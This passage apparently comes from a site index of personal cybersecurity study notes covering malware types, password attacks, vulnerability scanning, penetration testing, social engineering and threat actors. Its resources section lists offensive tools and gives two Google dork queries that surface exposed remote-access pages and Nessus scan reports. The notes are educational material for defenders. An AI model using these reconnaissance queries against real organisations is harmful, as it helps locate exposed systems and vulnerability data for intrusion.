deny having taken that action. Digital signatures are commonly used Security Incident # When there is a breach of any of the CIA Triad goals. Tip: Security therefore is not only about dangerous individuals, but also events like an earthquake. The 3 Cybersecurity Threats # DAD Triad Disclosure (aka data loss) \u0026lt;-\u0026gt; Confidentiality violation Data exfiltration (the act of moving data outside the intended organization/boundaries) Alteration \u0026lt;-\u0026gt; Integrity violation Denial \u0026lt;-\u0026gt; Availability violation Breach Impact # Types of impact/risks when a security incident happens. Many risks cover multiple types.\nFinancial - Equipment broken, new datacenter, loss of revenue, \u0026hellip; Reputational - Negative publicity Strategic - IP that allows competition to act faster, outsmart you, copy you, \u0026hellip; Operational - inability to do day-to-day functions, slow down business processes, \u0026hellip; Compliance - violating a legal or regulatory requirement (e.g. HIPAA) Security Controls # Control Objectives: Statements of desired security state (requirements). Security Controls: Speciifc measures, the implementation of the objectives/requirements. Gap analysis: Analyse gap between the Control Objectives and the Security Controls. Here we do actually Security Assesment and Testing. Security Control Categories: Technical - digital implementations (firewall rules, access control, \u0026hellip;) Operational - processes (access reviews, log monitoring, \u0026hellip;) Managerial - procedural mechanisms (periodic risk assesment, security planning excerices, \u0026hellip;) Physical - physical implementation (locks, fences, \u0026hellip;) ** Security Control Types** Preventive - Stop before it occurs (Firewalls, \u0026hellip;) Detterent - Prevent from attempting to violate the security policy (guarddogs, \u0026hellip;) Detective - Identify security events/issues that already have happened (Intrusion Detection Systems IDS, \u0026hellip;) Corrective - Remeditate a security issue that has happened (restore from backup, \u0026hellip;) Compensating - Mitigates the risk with alternative methods if the original control requirement. 3 criteria for PCI DSS Must meet the intent and rigor of the orginal requirement Must provide similar level of defense as the original Must be above and beyond other PCI DSS requirements Directive - Inform employees and others what they should do to implement security objectives. Data Protection # 3 States of data Data-at-rest Data-in-transit Data-in-use Data Loss Pevention (DLP) Information handling policies and procedures to prevent data loss and theft. 2 Environments Agent-based DLP - Installed as agents on a system to scan/monitor for senstive information, system config or actions. Agentless/network-based DLP - Monitors network traffic for risk or proof of data loss. Mostly to pick up on unencrypted content. DLP can take actions Pattern matching - find Social Security number formats, sensitive terms etc and trigger on that. Watermarking - tag sensitive documents, and the DLP scans all those tagged documments to find unencrypted data Data Minimization - minimaize the amount of senstive data Best: Destroy data once not required anymore Data deintification - remove possibility to link data back to an individual Data obfuscation - impossible to retrieve original data Hashing - senstive to raindbow table attack Raindbow Table Attack: If someone knows the hashing algoritm, they can hash all the IDs and use it later to reverse lookup. Tokenization - Use an intermediate ID between data and indivudal and secure that (like different IDs per user) Masking - Partial redacting (like credit card **** **** 0321) Access Restrisctions Limit ability of individuals/systems 2 Types Geographical: Limit based on geography of individual/system Permission: Limit based by role or level of authorization Segementation and Isolation Segmentation - Allows systems only to talk to each other within the same segment or limited access to other segments. Isolation - Enirely isolates a system from talking to others "},{"id":22,"href":"/cybersecurity/identity-and-access-management/","title":"Identity and Access Management","section":"Cybersecurity","content":" Identity and Access Management # Identity # Authentication and Authorization # Authentication and Authorization Technologies Authentication Methods # Passwords Multifactor Authentication One-Time Passwords Biometrics Accounts # Account Types Provisioning and Deprovisioning Accounts Access Control Schemes # Filesystem Permissions "},{"id":23,"href":"/cybersecurity/malware-types/","title":"Malware Types","section":"Cybersecurity","content":" Malware Types # Understand what differentiates them\nRansomware - Take over computer and demand ransom\nCrypto - Encrypts files and holds those hostage until payment made Threaten to report the user un return for money. Delivery Methods - Often via phising, Remote Desktop Protocal, etc.. Indicators Of Compromise (IoCs) Command \u0026amp; Control (C\u0026amp;C) traffic to known malicious IP addresses. Use of legitmate tools in abnormal ways to retain control of compromised system. Lateral movement processes that seek to attack/gain info about other systems in same trust boundary. Encryption of files Data exfiltration behaviors Notices to end user of the encryptoion process with demands for ransom Defense - Effective backup system in another location Trojans - Software often disguised as legitimate software, require user action\nRely on unexpected victims to run them Sometimes further content is downloaded to extend the malicious code Connects to a control server and then waits for instructions, allows for local instructions and such Example: Triada Trojan which was a enhanced version of Whatsapp RAT: Remote Access Trojans - give attackers with remote access to systems Indicators Of Compromise (IoCs) Signatures for specifc applications and downloadable files Command and control system hostnames and IP addresses Folders or files created on target devices Frequently connecting to changing remote unknown hosts Defense Awareness training Control software that (can) be installed Verify hashes Anti-malware Endpoint detection and Response (EDR) Worms - Spread themselves\nSpread via vulnerable services, email attachments, network file share, IoT, phones, \u0026hellip; They self install Example: Stuxnet Indicators Of Compromise (IoCs) Known malicious files Download of additional components from remote systems Command and control contact to remote systems Malicious behaviors using system commadns for injection and other activies Hands-on-keyboard attacker activity Defense Pre infection Network-level controls Fire-walls Network segmentation Post infection antimalware EDR Reset hardware Spyware - designed to obtain information about individual/organization/system\nTrack installed software, browsing behavior, web camers, \u0026hellip; and report back to central server. Stalkerware -\u0026gt; for monitor partners in relationship It looks like many other malicious code, so the key is the \u0026ldquo;INTENT\u0026rdquo; of it\u0026rsquo;s usage. Defense Antimalware User awareness Control software that (can) be installed Indicators Of Compromise (IoCs) Remove-access and remote-control-related indicators Known software file fingerprints Malicious processes, often disguised as system processes Injection attack against browsers Bloatware - Preinstalled applications (that you don\u0026rsquo;t want), just unwanted\nUsually not intentionally malicious May call home with information about your system and expose a vulnerbability to be exploited Defense Uninstall Clean OS image No IoCs Viruses - self-copy and self-replicate, but don\u0026rsquo;t spread via vulnerable services and networks (unlike worms)\nRequire user action to spread, only runs when infected file is run Usually have a trigger that decides when a virus will execute and a payload (what it will do) Fileless virus - Shell code that runs command line and script to run malicious code and it will redo that after reboot, while booted, lives in memory often. Defense Network controls Intrusion Prevention Systems (IPS) Indicators Of Compromise (IoCs) See threat feeds User awareness Antimalware Best: Wipe it, and restart from clean image or safe backip Keyloggers - Captures keystrokes from keyboard (and mouse, credit swipes, and any other input)\nGoal is for the attack to analyze these inputs Exists as Sofware and hardware Defenses Usere Awareness antimalware Patching and updates Indicators Of Compromise (IoCs) File hashes and signatures Extrafiltration activity to command and control systems Process banes Known reference URLS Logic Bombs - Functions or code placed inside other programs that will activate when set conditions\nEither by insider or by OSS supply chain hack Once it triggers, payload executes, so activites/actions happen then. No IoC as it\u0026rsquo;s in the code Doesn\u0026rsquo;t care to replicate Defenses Code reviews \u0026amp; Integrity checks File integrity Rootkits - specificly designed for attackers to get a backdoor to the root of a system\nMany have capabilities to hide , they use various layers to make them \u0026ldquo;not appear to be there\u0026rdquo;. Persistent, stealth access is the goal Defenses Clean rebuilt or trustworthy backup Good security practices, patching, \u0026hellip; Secure Boot Remove the HDD and connect to other system without booting from that HDD, now no code will trigger. Indicators Of Compromise (IoCs) Files hashes and signatures Command and control domains, IP addrewss and systems Behavior based identification like creation of services, executables, configuration changes, file access and command invocation Opening ports or creation of reverse proxy tunnels Notes\nDifferent vendors might name the same malware different which makes it difficult Remote access is usually via a backdoor, rootkit "},{"id":24,"href":"/cybersecurity/monitoring-and-incident-response/","title":"Monitoring and Incident Response","section":"Cybersecurity","content":" Monitoring and Incident Response # Incident Response # The Incident Response Process Training Threat Hunting Understanding Attacks and Incidents Incident Response Data and Tools # Monitoring Computing Resources Security Information and Event Management Systems Alerts and Alarms Log Aggregation, Correlation, and Analysis Rules Benchmarks and Logging Reporting and Archiving Mitigation and Recovery # Secure Orchestration, Automation, and Response (SOAR) Containment, Mitigation, and Recovery Techniques Root Cause Analysis "},{"id":25,"href":"/cybersecurity/network-security/","title":"Network Security","section":"Cybersecurity","content":" Network Security # Designing Secure Networks # Infrastructure Considerations Network Design Concepts Network Segmentation Zero Trust Network Access Control Port Security and Port-Level Protections Virtual Private Networks and Remote Access Network Appliances and Security Tools Deception and Disruption Technology Network Security, Services, and Management Secure Protocols # Using Secure Protocols Secure Protocols Network Attacks # On-Path Attacks Domain Name System Attacks Credential Replay Attacks Malicious Code Distributed Denial-of-Service Attacks "},{"id":26,"href":"/cybersecurity/password-attacks/","title":"Password Attacks","section":"Cybersecurity","content":" Password attacks # Brute-Force - Iterate through passwords until they find one that works This can include using lists with generic commonly used passwords or tailored to the target Many passwords attempts for a single user Password Spraying - a brute-force variation Few passwords attempts but for many users Example: On a sports fan website, most likely one user, uses the teams name or player as password Dictionairy Attacks - a brute-force variation Uses a distinct list of words Popular Tool: John The Ripper and Tutorials Envirment Online: Run and test passwords against life system with risk getting blocked/caught Offline: You have the hashes or offline copy and you can in all peace go at it. For example a precomputed list of hashes (Rainbow table attack) Hash salts and peper is used to counter rainbow table attack "},{"id":27,"href":"/cybersecurity/privacy/","title":"Privacy","section":"Cybersecurity","content":" Privacy # Data Inventory Information Classification Data Roles and Responsibilities Information Life Cycle Privacy Enhancing Technologies Privacy and Data Breach Notification "},{"id":28,"href":"/cybersecurity/resilience-and-physical-security/","title":"Resilience and Physical Security","section":"Cybersecurity","content":" Resilience and Physical Security # Resilience and Recovery in Security Architectures # Architectural Considerations and Security Storage Resiliency Response and Recovery Controls # Capacity Planning for Resilience and Recovery Testing Resilience and Recovery Controls and Designs Physical Security Controls # Site Security Detecting Physical Attacks "},{"id":29,"href":"/cybersecurity/resources/","title":"Resources","section":"Cybersecurity","content":" Cybsersecurity Resources # Sites # http://socinvestigation.com/ Threat Feeds # Senki - senki.org/operators-security-toolkit/open-source-threat-intelligence-feeds Open Threat Exchange - cybersecurity.att.com/open-threat-xchange MISP Threat sharing - www.misp-project.org/feeds ThreadFeeds - threadfeeds.io US Cybesecurity \u0026amp; Infrastructure Security Agency (CISA) - www.cisa.gov Every country has such an agency and feed, get familiar with it, based where you work US Department of Defence Cyber Crime Center - www.dc3.mil CISA\u0026rsquo;s automated Indicator Sharing (AIS) Microsoft - http://www.microsoft.com/en-us/security/blog/topic/threat-intelligence Cisco SANS Internet Storm Center - isc.sans.org Virusshare - virusshare.com \u0026hellip; Tools # General # https://www.metasploit.com/ https://www.zaproxy.org/ https://nmap.org/ https://www.metasploit.com/ https://www.wireshark.org/ https://portswigger.net/burp https://www.wigle.net/ https://www.openwall.com/john/ https://www.aircrack-ng.org/ https://finchsec.com/courses/wifi-exploitation-101/ https://github.com/aircrack-ng/aircrack-ng git@github.com:xwmx/airport.git netstat for checking all active ports Wireshark - Sniff packets in local machine or network Grouped # Vulnerability Assessment and Management: a. Nessus: A vulnerability scanner that identifies potential weaknesses in networks, systems, and applications. b. OpenVAS: An open-source vulnerability scanner and manager with a large database of plugins. c. Qualys: A cloud-based platform for vulnerability management, compliance, and web application security.\nIntrusion Detection and Prevention Systems (IDS/IPS): a. Snort: An open-source network intrusion detection and prevention system. b. Suricata: A high-performance network IDS/IPS with multi-threading capabilities. c. Zeek (formerly Bro): A powerful network security monitoring tool with deep protocol analysis.\nSecurity Information and Event Management (SIEM): a. Splunk: A data analytics platform that provides real-time monitoring, log management, and threat intelligence. b. LogRhythm: An integrated platform for threat detection, response, and compliance. c. OSSIM: An open-source SIEM solution that combines multiple security tools and intelligence feeds.\nNetwork Firewalls: a. pfSense: An open-source firewall and router solution based on FreeBSD. b. Fortinet: A range of high-performance, integrated security appliances for various network sizes. c. Cisco ASA: A series of adaptive security appliances for enterprises, providing firewall, VPN, and intrusion prevention services.\nEndpoint Protection: a. Microsoft Defender: An antivirus and endpoint protection solution, integrated with Windows operating systems. b. Symantec Endpoint Protection: A comprehensive endpoint security solution, providing antivirus, firewall, and intrusion prevention. c. CrowdStrike Falcon: A cloud-based endpoint protection platform, offering next-gen antivirus, endpoint detection and response (EDR), and threat intelligence.\nWeb Application Firewalls (WAF): a. ModSecurity: An open-source WAF that protects web applications from common threats like SQL injection and cross-site scripting (XSS). b. Cloudflare: A cloud-based WAF, offering protection against DDoS attacks and other web application threats. c. Imperva: A WAF solution providing protection for applications, data, and APIs from various attack vectors.\nEncryption and Privacy Tools: a. OpenSSL: An open-source toolkit for implementing the Secure Sockets Layer (SSL) and Transport Layer Security (TLS) protocols. b. GnuPG: An open-source implementation of the OpenPGP standard, allowing secure communication and data encryption. c. VeraCrypt: A free, open-source disk encryption software for protecting sensitive data.\nPassword Management and Authentication: a. LastPass: A cloud-based password manager for securely storing and managing passwords. b. KeePass: An open-source password manager, allowing users to store and manage passwords in an encrypted database. c. Duo Security: A multi-factor authentication solution that verifies users\u0026rsquo; identities before granting access to applications.\nDigital Forensics and Incident Response (DFIR): a. Autopsy: An open-source digital forensics platform for analyzing disk images, file systems, and memory dumps. b. Volatility: An open-source memory forensics framework for incident response and malware analysis. c. EnCase: A digital forensics and e-discovery software, widely used by law enforcement and corporate security teams.\nPenetration Testing: a. Kali Linux: A Linux distribution designed for penetration testing, with preinstalled security tools like Metasploit, Nmap.\nGoogle Hacking # Type allinurl:tsweb/default.htm in google, returns Remote access connection pages. Type \u0026quot;intitle:NEssus Scan Report\u0026quot; \u0026quot;This file was generated by nessus\u0026quot; in google, returns vulnerability scans. https://www.exploit-db.com/google-hacking-database https://github.com/laramies/metagoofil https://github.com/laramies/theharvester https://github.com/xmendez/wfuzz Web Mirroring / Website footprinting # HTTrack Black Widow [WebRippter](https://webripper.software.informer.com/download/ (Not OFFICIAL DOWNLOAD) Backstreet Browser Use WGET Podcasts # https://darknetdiaries.com/ Learn # https://www.hackthebox.com/ https://www.itpro.tv/ Social Engineering # SEF: Social Engineering Franework BOOK https://www.maltego.com/downloads/ Others # https://cloudsecurityalliance.org/ https://radar.cncf.io/2021-09-devsecops https://www.microsoft.com/en-us/securityengineering https://www.microsoft.com/en-us/securityengineering/opensource/ OOSTMM - Open Source Security Testing Methodology Manual https://www.tenable.com/products/nessus Way Back Machine - (In history, some interesting formation can be found on company sites or so) Website watcher - Wath websites and notify if anything changes https://www.shodan.io/ - Find anything connected Vulnerability Databases # technet.microsoft.com www.securityfocus.com www.hackerstorm.co.uk www.exploit-db.com www.securitymagazine.com www.trendmicro.com www.darkreading.com "},{"id":30,"href":"/cybersecurity/risk-management/","title":"Risk Management","section":"Cybersecurity","content":" Risk Management and Privacy # Analyzing Risk # Risk Identification Risk Assessment Risk Analysis Managing Risk # Risk Mitigation Risk Avoidance Risk Transference Risk Acceptance Risk Tracking # Risk Register Risk Reporting Disaster Recovery Planning # Disaster Types Business Impact Analysis "},{"id":31,"href":"/cybersecurity/security-assesment-and-testing/","title":"Security Assesment and Testing","section":"Cybersecurity","content":" Security Assesment and Testing # Vulnerability Management # Definition: Identify, prioritize and remediate vulnerabilities in your environment(s).\nIdentify Scan Targets The scope depends, it can be all systems or depending on some critercia: What is the data classification of the information at-rest/in-transit/in-use by the system? Is the system publicly exposed? What services are running on the system? Is it dev/staging/prod? Key goal: Build an asset inventory and then decide to which subset the scope reaches. ASV: Approved Scan Vendor (in case of PCI DSS compliance) Determin Scan Frequency How often should they run? Influenced by Risk appetite Regulatory Requirements - Like PCI DSS or FISMA that dictate a minimum frequency Technical Constraints - If a test takes 12h, you can only run 2/day. Business Constraints - Scans might cause disruptions that are not acceptable. Licensing limitations TIP: Start Small and increase based on needs, feedback and experience. Examples: Nesus Configuring Vulnerability Scans Scan Sensitivity Levels - Determine the types of check, but could disrupt target environments if too agressive 1 distinct vulnerability = 1 plugin 1 plugin family = 1 OS, application, \u0026hellip; Disabling unnecessary plugins improves speed Supplementing Network Scans Server-based scanning: Basic test run and probe over the network, testing from a distance - simulates realistically what an attacker sees. (ala Server-based scanning) Firewalls and other security controls might impact the scan results. Supplement server-based scans with extra information of the targets/systems Credentialed Scanning: Scanner can verify first with a system if possible vulnerability is already mitigated (e.g. right patch installed). They only retrieve info, so make sure there is read only access (least privlege) for the used credentials. Agent-Bases Scanning: Scan configuration, inside-out scan, and report back to scanner. Some fear the performance/stability impact of such agents, start small to gain trust and confidence Scan Perspective A perspective: A specific location within the network, so you can run tests from different \u0026ldquo;perspectives\u0026rdquo;. Example: One perspective is public internet, Other perspective from the intranet. (PCI DSS requires this) Might be impacted by Firewall settongs Network segmentation Intrusion detection systems (IDSs) Intrusion prevention systems (IPSs) Scanner Maintenance Make sure that vulnerability feeds are up-to-date Scanner software Make sure to patch the scanner software itself, for vulnerabilities. Vulnerability Plug-In Feeds Automatically and regularrly auto download new plugs related to new vulnerabilities. Security Content Automation Protocol (SCAP) - by NIST, Standerized way of communicating security-related information Common Configuration Enumeration (CGE) - discuss system config issues Common Platform Enumeration (CGE) - describe product names and versions Common Vulnerabilities and Exposures (CVE) - describe security-related software flaws (before: Common Vulnerability Enumeration) Common Vulnerability Scoring System (CVSS) - describe severity of CVE\u0026rsquo;s Common Configuration Checklist Description Format (XCCDF) - describe checklists and reporting results of said checklists Open Vulnerability and Assesment Language (OVAL) - describe low level testing procedures by said checklists Vulnerability Scanning Tools Network Vulnerability scanners - Tenable\u0026rsquo;s Nessus, Qualy, Rapid7\u0026rsquo;s Nexpose, OpenVAS Application Vulnerability Scanners - Static Testing (the code), Dynamic Testing (runtime), Interactive Testing (combining both) Web Application Vulnerability Scanners - Niko, Arachimi, Acunetix and Zed Attach Proxy (ZAP) Specialized in WEB applications and their typical vulnerabilities Cross-Site Scripting (XSS) Cross-Site Forgery (XSF) SQL Injection Etc Understanding CVSS (v3.1) This scored is often used to priorite what to act on first. from 0 to 10 rating 0.0 - None 0.1 -\u0026gt; 3.9 - Low 4.0 -\u0026gt; 6.9 - Medium 7.0 -\u0026gt; 8.9 - High 9.0 -\u0026gt; 10 - Critical Calculated by 3 metrics types First 4 evaluate the exploitability Next 3 evaluates the impact Last 1 evaluates the scope scope 8 distrinct metrics Attack Vector (exploitability) - Need to be physcally there or can it be remotly? Attack Complexity (exploitability) - Do I need specialized conditions ? Privileges Required (exploitability) - What privileges do I need ? User Interaction (exploitability) - is another human required ? Confidentiality (impact) Integrity (impact) Availability (impact) Scope The total score (and other derivates) can be computed, as the individual scores are in the CVSS format. Example CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N CVSS Format v3.0 Attack Vector Network Attack Complexity Low Privileges Required None User Interaction None Scope Unchanged Confidentiality High Integrity None Availability None Confirmation of Scan Results When a vulnerability is present: Possitive report When a vulnerability is not present: Negative report A positive or negative report can be \u0026ldquo;false\u0026rdquo; if an error occurd and the opposite is true Don\u0026rsquo;t trust only the results, do supplementary research and verifications with sources like Log files Security Information and Event Management (SIEM) - corrolate log files from different sources Configuration Management Systems - provide info on systems and what\u0026rsquo;s installed on them Vulnerability Classification # Patch Management - Often ignored due to lack of resources or \u0026ldquo;Fear\u0026rdquo; of change/instability Legacy Platforms - Discontinued products, Often ignored due to lack of resources or \u0026ldquo;Fear\u0026rdquo; of change/instability Weak Configurations Use of default config (admin/setup page still exposed) Default credentials or unsecured accounts Open service ports (but unused) Permissions that violate the least privilege Error Messages - Descriptive error messages, useful to the attacker, especially if debug mode is still on Insecure Protocols - Discontinued or old protocol versions Weak Encryption Most important: The algorithm The key that goes with it Penetration Testing # Adopting the Hacker Mindset - Instead of defending against everything, you just need to find one little crack, you only need to win once Taking an adversary mindset Reasons for Penetration Testing Complentary to all other efforts, and brings another angle. Benefits of Penetration Testing Benchmark: someone with the skillset of this pen tester can or cannot get in Get remediation tips and insights Get step by step insights on how to reproduce vulnerabilities Threat Hunting is also using a hacker mindset, but you don\u0026rsquo;t test against the live system, They imagine on how a hacker might have getting around a security control, what evidence they might leave behind and then search for proof (IoCs). THis outputs usually different results. If they find compromise, go incident handling mode, and create postmortem. Penetration Test Types 4 Categories Physical - focus on physical security controls Offensive - By redteam - Pentester acts as attackers to identify and exploit Defensive - By blueteam - Focus on ability to defend against attacks and assses the effectiveness, so they can simulatee an attack and then see if they\u0026rsquo;re able to respond well. Integrated - Combines Offensive and Defensive 3 types of knowledge before starting White/Clear Box or Known Environment tests - All tech information provided Less time on discovery, more time for targetted efforts of attack. Grey Box or partially known Environment tests - A blend Helps to target a pentesters focus and time but still to a degree mimick the experience for a hacker. Black Box or unknown Environment tests - More real life situation that an attacker experiences, so more discovery and more time consuming. Rules Of Engagement (RoE) Timeline - When, how long? Scop - Inclide/exclude locations, systems, applications, or other potential targets Data Handling requirements - How to handle an information that got disclosed during the pentest Target Expected Behavior - What behavior to expect from the target Commited Resources - Time commitment of certain personal during the testing Legal concerns When and how communications happen - regular updates? What if a critical issue is found ? etc\u0026hellip; Permission: Make sure to have a signed permission, your free out of jail card when getting caught or things go south. Reconnaissance Even in white box, reconnaissance is done to supplement. Passive reconnaisance - gather info without interacting with the target or organization Active reconnaisance - directly engage, like port scanning etc\u0026hellip; Footprinting: Scanning which servers are used and versions War Driving/Flying - Drive/Fly by office with high-end antennas and attempt to eavesdrop or connect to WIFI. Running the test - Key phases Initial Access - when attacker exploits a vulberability to gain access to the organization\u0026rsquo;s network. Privilege Escalation - using hacking techniques to elevate from initial access. Pivot/lateral move - hacker gains access to other systems from the initial compromised system Establish persistance - Installing backdoors and other techniques that allows to regain access at a later stage. Metasploit Cleaning Up Present results Cleanup traves of their work Remove any tools or malware they might have installed Audits and Assesments # Security Tests - Verify that a control is functioning properly Should happen regular Focus on the key security controls Asses following factors when scheduling a test Availability of security testing resources Criticality of the systems and appliications protected by the tested controls Sensitivity of information contained on tested systems and applications. Likelihood of technical failure of the mechanism implementing the control. Likelihood of a misconfiguratiin on the control that would jeopardize security. Risk that the system will come under attack Other changes the technical env that might affect control performance. Difficulty and time required to perform a control test Impact of the test on normal business operation TL;DR; Design your tests rigourisly Responsible Disclosure Programs Allows security researchers to securily info about vulnerabilities in a product with the vendor. Bug bounties is a form of this Security Assesments - Comprehesive review of the security of a give scope Perform risk assesment of a said scope Security Audits - External/impartial people who test the security controls Uses similar techniques as security assesments Results in an attestation (good for certification) With internal auditing, the auditors have a different line of reporting than the security team. Requested by the organization itself or its governing body Service Organized Controls (SOC) External audits are for attestation Independent Third Party Audits are a subgroup Here the request for the audit comes from a regulator, customer or other outside entity. Auditing Standards Control Objectives for Information and related Technologies (COBIT) - requirements surrounding information systems Maintainted by ISACA which also created CISA (Certified Information Systems Auditor), CISM (Certified Information Security Manager) Vulnerability Life Cycle # Vulnerability Identification Potential Sources: Vulnerability scans, pentration tests, Responisble disclosure, Audits Vulnerability Analysis Validate if it exists Prioritize and categorize using CVE and CVSS Supplement with external analysis Vulnerability Response and Remediation Based on scoring, we can guide which are most in need of remediation Some examples how Cybersecurity specialists deal with it: Patching Network segmentation to decrease the risk Implement other compensating controls (Firewalls, IPS,\u0026hellip;) Purchase insurance to transfer risk Formally accept risk Vulnerability of Remediation Test by rescanning or reproducing Might need to be done by external auditors Reporting Communicate findings, action taken, lessons learned to relevant stakeholders. Make sure decisions makers are informed. May include: Identified, analyzed and remediated vulnberabilities with CVE/CVSS Details on remediation steps Highlight trends, conclusions, insights Offer recommendations for improvement "},{"id":32,"href":"/cybersecurity/security-governance-and-compliance/","title":"Security Governance and Compliance","section":"Cybersecurity","content":" Security Governance and Compliance # Security Governance # Corporate Governance Governance, Risk, and Compliance Programs Information Security Governance Types of Governance Structures Understanding Policy Documents # Policies Standards Procedures Guidelines Exceptions and Compensating Controls Monitoring and Revision Change Management # Change Management Processes and Controls Version Control Documentation Personnel Management # Least Privilege Separation of Duties Job Rotation and Mandatory Vacations Clean Desk Space Onboarding and Offboarding Nondisclosure Agreements Social Media Third-Party Risk Management # Vendor Selection Vendor Assessment Vendor Agreements Vendor Monitoring Winding Down Vendor Relationships Complying with Laws and Regulations # Common Compliance Requirements Compliance Reporting Consequences of Noncompliance Compliance Monitoring Adopting Standard Frameworks # NIST Cybersecurity Framework NIST Risk Management Framework ISO Standards **Benchmarks and Secure Configuration Guides Security Awareness and Training # User Training Ongoing Awareness Efforts "},{"id":33,"href":"/cybersecurity/social-engineering/","title":"Social Engineering","section":"Cybersecurity","content":" Social Engineering # Human side of cybersecurity Social Engineering And phising often preceed password attacks. Using the \u0026ldquo;Human Threat vector\u0026rdquo; Goal: Influence target(s) to take actions that they else would not Key Principiples to sucess: Authority - Give the impression that you have authority, most people obey to someone that seems in charge or knowledgable, regardless if they are or not. Intimidation - Scare or threaten the target so they feel threatened and they take the action that the attacker wants them to do. Consensus - (aka Social Proof) people tend to do what other (many people already did), \u0026ldquo;everyone in here did this except for you\u0026rdquo; Scarcity - Make something look more desirable to the target Familiarity - Making the target like the attacker or the organization that the attacker claims to represent Trust - Similar to familiarity, here the attacker builds a connection with their target to them make them do things. Urgence - Sense or urgency to take the chance away for the target to evaluate the situation Often a combination of principles are used. Understand the target, how humans react, how stress reactions can be leveraged to meet a goal. Social Engineering Techniques Phising - Fraudelent acquisition of information Spear phising - targetting a specific individual/group Whaling - aimed at senior people (CEO, CTO, \u0026hellip;) Defenses: Awareness training Vishing - Phising via phone call Often based on urgency/trust and authority Smishing - Phising via SMS/IM Often based on urgency/trust and authority Often trick someone to click on a link to enter credentials or senstive information Misinformation \u0026amp; Disinformation - Online influencer campaigns Social media, email, online mediums Types (MDM) Misinformation - Not True, without malicious intent I believe it\u0026rsquo;s true, but its wrong Disinformation - Not True, with malicious intent Malinformation - based on reaility, but consciously removed context and using exaggeration with malicious intent CISA recommends \u0026ldquo;TRUST\u0026rdquo; oricess to counter mis/disinformation Tell your story Ready your team Understand and assess MDM. Strategize response. Track outocomes. Defense: asses info environment, identify vulnerabilities, proactive communication, develop incident response plan. Impersonation - Attack pretends to be someone else Might use identity graud Business Email Compromises (BEV) - AKA Email Account Compromise (EAC) Defeneses: Awareness and MFA Methods Using compromised accounts Sending spoofed emails Using common fake but similar domain techniques Using malware or other tools Pretexting - Using a made uo scenario on why the attacker approaches the target Often to make impersonation more believable Defeneses: Be critical, and do a verification call Watering Hole Attacks - Use websites that the target frequently uses Attackers can set an attack, knowing the target will visit the site. By compromising the site or deploying malway through advertising networks Brand Impersonation/spoofing - Also a phising attack Send email as if it comes from the brand Often intended to have the target log in to a link Typosquatting - Have a copy/compromised site with a common typo im url Pharming - Changing the host file of a person to do similar attack "},{"id":34,"href":"/cybersecurity/threat-landscape/","title":"Threat Landscape","section":"Cybersecurity","content":" Threat Landscape # Threats # Threat Characteristics Internal vs. External - Within or outside our organization. Level of Sophistication/Capability - from script kiddie to APT (advance persistant threat) Resources/Funding - from hobbyists to government funded Intent/Motivation - from \u0026ldquo;trill\u0026rdquo; to \u0026ldquo;warfare\u0026rdquo;, from white to black hat White Hat - Act with authorization and seek vulnerabilities with the intent of correcting them. Grey Hat - Act without authorization, but seek to inform targets from found vulnerabilities. Black hat - Act without authorization, with malicious intent. Advance Persistent Threat (APT) - Advanced attacks that persistent for a long time, stalking targets to attach when most strategic. Shadow IT - Indivduals/groups use technology/tools that are outside the approved solutions. Threat Actors Unskilled - (Script kiddie), little skill, depend on (automated) tools they downloaded, often don\u0026rsquo;t understand how the tools work. Do not underestimate this threat and risk They often randomly take targets, and there are many. Hactivists - Want to reach an activist goal Might take greater risk, cause their goal is more important than getting caught. Maybe even martyrdom. Organized Crime - Primairy goal is to make money Like to be low profile, not get caught, it takes money to make money Nation-State Attackhers - Often do APT, it\u0026rsquo;s all about strategic power and influence. They often search for Zero-Day attacks and exploit them. Insider Threat - Employer, contractor, vendor or anyone with authorized access attacks the organization. Competitors - Corporate espionage Characteristic Unskilled Hacktivists Organized Crime Nation-State Insider Competitor Internal/External External External (mostly) External External Internal Both Sophistication/Capability Low Any Level Mid to High High Any Any Resources/Funding Few Any range Many Many Few Many Intent/Motivation Thrill/status Ideals Money Economic/Espionage/Political Varied Economic/Business Attaker Motivations Data exfiltration - desire to obtain sensitive/IP information. Espionage - organizations desiring to steal secret information Service disruption - Seek to stop opperations Blackmail - Seek to get money or concessions by threating to release secret info or more attacks. Financial Gain Ideoligy/Beliefs Ethical - White hat Revenge - just to embarrse or damage Disruption/chaos War - Manipulate the outcome of an armed conflict Threat Vectors and Attack Surfaces Attack Surface - A llsystem/application/service that could be potentially exploited Threat Vector - The actual vulnerability chosen from the attack service. The means to obtain that access. Message-Based - Email is most exploited attack vector. They only need ONE person to be tricked. Other channel: SMS, IM, Voice call, \u0026hellip; Wired networks - physically connecting to the on-prem network, or accessing a device that\u0026rsquo;s connected to it. Wireless networks - Don\u0026rsquo;t require physical access to the network, bluetooth is also a risk. Systems - Individual systems Files \u0026amp; Images - Infected files with malicious code that trigger once openend. Removeable devices - USB drives, Memory cars, trick anyone to put it in their computor. Cloud - Default configs, public access, of any cloud service. Supply Chain - Interfere with the organization\u0026rsquo;s IT supply chain (e.g. infect OSS packages, patched hardware, \u0026hellip;) Managed Service Providers (MSPs) often have special priviledge access to an organization\u0026rsquo;s network. Hard to adress and mitigate Threat Data \u0026amp; Intelligence # Threat Intelligence: Resources and activities available to learn about changes in the threat environment. Can be used for predictive risk. OSINT tools/methods Vunerability databases Threat feeds Indicators of compromise (IoCs) - Like file hashes, signaturesm ,,, OSINT Key is to find up-to-date sources Examples Proprietary \u0026amp; Closed-Source Intelligence Might provide, better, curated and quality threat feeds Use multiple feeds - To cross check if any is slow or not updating Threat Maps - Geographic view of threat intelligence, but notoriously unreliable (VPNs, Proxies, \u0026hellip;) Assessing Threat Intelligence - regardless the source, assesment is required Is it timely? Is this information accurate? - Can you rely on provided information? Often correct? Is this information relevant? - Might not be relevant to your organization Confidence Score - Filter/assess data based on how much they trust it. The lower the score, one should be cautious to make important decisions, but not ignore the source The higher the score, the more trust and cofidence can go in major decisions. Many threat feeds provice a score. For example: 90 - 100: Confirmed - multiple sources and direct analysis to confirm its true 70 - 89: Probable - Depends on logical inference 50 - 60: Possible - agreed with the analysis but assesment not confirmed 30 - 49: Doubtful - Possible but not the most likey option, but there is no information that allows to disprove it 2 - 29: Impropable - Possible but refuted by others 1 : Discredited - Just plain not true Threat Indicator Management \u0026amp; Exchange - standerized communication protocals Structured Threat Information eXpression (STIX) - XML, a json variation exists Trusted Automated eXchange of Intelligence Information (TAXII) - communicate on HTTP level. See Github Information Sharing Organizations Industry-specific collaborative organizations that facilitate trusted human + machine Information Sharing and Analys Centers (ISACs) - for intrastructuree owners and operators National ISACS 